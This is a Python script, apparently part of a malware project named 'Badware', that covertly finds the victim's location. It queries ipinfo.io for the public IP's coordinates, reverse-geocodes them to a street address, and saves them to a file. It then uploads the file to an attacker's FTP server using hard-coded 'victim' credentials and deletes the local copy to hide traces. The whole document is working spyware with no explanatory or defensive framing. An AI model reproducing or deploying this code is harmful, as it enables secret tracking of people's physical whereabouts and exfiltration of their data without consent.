# get gps coordinates from geopy
import ftplib
import json
import os
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
from urllib.request import urlopen
from geopy.geocoders import Nominatim
# open following url to get ipaddress
urlopen("http://ipinfo.io/json")

# load data into array
data = json.load(urlopen("http://ipinfo.io/json"))

# extract lattitude
lat = data['loc'].split(',')[0]

# extract longitude
lon = data['loc'].split(',')[1]

#print(lat, lon)
geolocator = Nominatim(user_agent="geoapiExercises")
location = geolocator.reverse(f"{lat},{lon}")
address = location.raw['address']
if os.path.isfile(fr"C:\users\{username}\AppData\Local\Aryan\Badware\location.txt"):
    os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\location.txt")
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\location.txt", "x") as f:
    f.writelines(f"latitide: {lat}\n")
    f.writelines(f"longitude: {lon}\n")
    f.writelines(f"address: {location}\n")
    f.writelines(f"Location dictionary: {address}\n")
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\location.txt", 'rb') as loc:
    session.storbinary('STOR location.txt', loc)
session.quit()
os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\location.txt")